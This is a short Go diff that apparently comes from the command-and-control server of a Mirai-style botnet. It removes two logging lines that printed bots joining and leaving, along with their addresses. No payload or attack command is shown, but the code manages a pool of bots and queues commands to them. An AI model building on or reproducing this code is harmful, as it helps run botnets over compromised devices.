@@ -60,12 +60,10 @@ func (this *ClientList) Distribution() map[string]int {
 
 func (this *ClientList) AddClient(c *Bot) {
 	this.addQueue <- c
-	fmt.Printf("\x1b[1;32mJOINED \x1b[1;37mBot:\x1b[1;33m%s \x1b[1;37mType:\x1b[1;33m%s\n", c.conn.RemoteAddr(), c.source)
 }
 
 func (this *ClientList) DelClient(c *Bot) {
 	this.delQueue <- c
-	fmt.Printf("Deleted client %d - %s - %s\n", c.version, c.source, c.conn.RemoteAddr())
 }
 
 func (this *ClientList) QueueBuf(buf []byte, maxbots int, botCata string) {
